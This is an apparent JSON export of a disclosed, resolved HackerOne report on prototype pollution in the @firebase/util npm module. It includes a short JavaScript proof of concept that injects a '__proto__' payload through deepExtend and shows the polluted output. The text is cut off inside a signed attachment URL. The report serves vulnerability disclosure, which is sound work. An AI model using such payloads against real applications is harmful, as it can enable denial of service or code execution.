{"id":1001218,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDAxMjE4","url":"https://hackerone.com/reports/1001218","title":"[@firebase/util] Prototype pollution","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2020-10-07T15:00:05.498Z","submitted_at":"2020-10-07T15:00:05.559Z","is_member_of_team?":false,"is_organization_group_member?":false,"is_triager?":false,"reporter":{"disabled":false,"username":"d3lla","url":"/d3lla","profile_picture_urls":{"small":"/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"},"is_me?":false,"cleared":false,"verified":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"pentest_retesting_ends_at":null,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program was used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"submitted_by_team_member":false,"submitted_with_assistant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-11-17T17:42:42.628Z","bug_reporter_agreed_on_going_public_at":"2020-11-17T17:42:42.568Z","team_member_agreed_on_going_public_at":"2020-11-17T12:02:01.503Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Module\n\n**module name:** `@firebase/util`\n**version:** `0.3.2`\n**npm page:** `https://www.npmjs.com/package/@firebase/util`\n\n## Module Description\n\nNOTE: This is specifically tailored for Firebase JS SDK usage, if you are not a member of the Firebase team, please avoid using this package\n\nThis is a wrapper of some Webchannel Features for the Firebase JS SDK.\n\n## Module Stats\n\n[1,516,157] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nI tested the [`deepCopy`](https://github.com/firebase/firebase-js-sdk/blob/master/packages/util/src/deepCopy.ts) and [`deepExtend`](https://github.com/firebase/firebase-js-sdk/blob/master/packages/util/src/deepCopy.ts) functions.\n\nThe `deepCopy` and `deepExtend` functions can be used to add/modify properties of the Object prototype. These properties will be present on all objects.\n\n## Steps To Reproduce:\n- install `@firebase/util` module:\n    - `npm i ``@firebase/util`\n\nRun the following poc:\n```javascript\nconst utils = require('@firebase/util');\n\nconst obj = {};\nconst source = JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}');\nconsole.log(\"Before : \" + obj.polluted);\nutils.deepExtend({}, source);\n// utils.deepCopy(source);\nconsole.log(\"After : \" + obj.polluted);\n\n```\nOutput:\n```console\n\nBefore : undefined\nAfter : yes\n```\n{F1024346}\n\n## Supporting Material/References:\n\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v14.11.0\n- NPM VERSION: 6.14.8\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nThank you for your time.\n\nbest regards,\n\nd3lla\n\n## Impact\n\nThe impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.","original_report_id":null,"original_report_url":null,"attachments":[{"id":1024346,"file_name":"firebase_util_poc.mov","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/eHvqvfPk89hFAHyg1NBu75Cw?response-content-disposition=attachment%3B%20filename%3D%22firebase_util_poc.mov%22%3B%20filename%2A%3DUTF-8%27%27firebase_util_poc.mov\u0026response-content-type=video%2Fquicktime\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQH4BHWDS%2F20260429%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20260429T084017Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjECgaCXVzLXdlc3QtMiJIMEYCIQDeC8ErLaaJYBUjNqXr3eh14JY9xr8cbjwKhkDn2SW0dgIhAMhd9jAvZzKpffvr%2FlYvweePrQCbWQOmK9fnfzgh%2FBMWKroFCPH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxwV%2BFBSGlJtPhejcAqjgWaEWtCcL3uG4As1RlK7U%2BtNfMrTQzThKa0M%2BTx1%2Faz7hiLUfQSS4PBxhSJZ3gqBDiwmQ%2BRyA8Ts0X4Pv%2BMXnc%2BRZWC4F3PsbWnbF%2FhlzY3XMVLrQjIO6fLJM5y43xW8uxiw7re%2BqN8flWn8KjRJYG%2BaFPAjxZKUwMVgCdd5fJVMcryWMijM3jieEDomR6lY%2BVJNY%2BpB6ZGo0DhcISjyZgKtt0TXceqSatZUlqQ1fLN81%2FCgNU%2FbjQ%2BkgsPT0oomr6lz9hUq%2B3xQXTE9RUxfin6M%2F156Z58RvGjlWfd%2BLS5flau9qnABJ4f5bzbJrDkd7Jk1N9%2BPr53cvtwav7pVnyQViIdbDYdW%2Fhgc4atmuuuMReRpB%2BYiumSSapT33QjMXi3fh0QuWFA6yfu1GCwR%2BYTlvPyfN0roafVzWuV4kyyYmRhH7S3K29S3yJYIGWwI%2FoHf%2B8u1Jv%2BsCpzrQoXpr4qq6dR2f01kmSW7e7nmm%2FLXZit%2FlOYO4PFuf%2BgwTfY25yyGffZL%2BacVbRvk518u4xucQ9kcOUbwlZIlSU%2F457VGvpWkydyP2359VXw60ake7Fvfx8OrEcQVlJC8shb2Qs%2F4nC9z%2B0OhyCE2pLuxZoFDLzRMYmF8Hwno%2FV5v3Xt7mH8s8DWGZK2SqeVgZ1R6oYcSp5b3a5ZX0ihE%2BVRIO9xghe6TWm%2Fzy4Lop7%2FphmfSA%2BboTppg5vHZ41R5qhOdi1ep7MnDOy1WJ2FfyMtPL4FfvwjzpNhJtfhSWiD17mxBuAeg5yEjIGi9hwC11KggmpJyNeopEgVaFX818WIo6iOYlyzOzPry%2BiBY1YCDJuD%2Bvpb9EjBJH8tMELPX8gCz5v3a2ulBA4BkKLD%2BJzVdbUw1OjGzwY6sAFG%2BU2PSQGuyET7eQXfoJP4TiWf2iHKDp4aLq4EXaC7jOKNkqyAIQ8T%2BbtqCAPAzL9mYXz9Gb3jos77LqesmfuC3Sp50tY42FBfU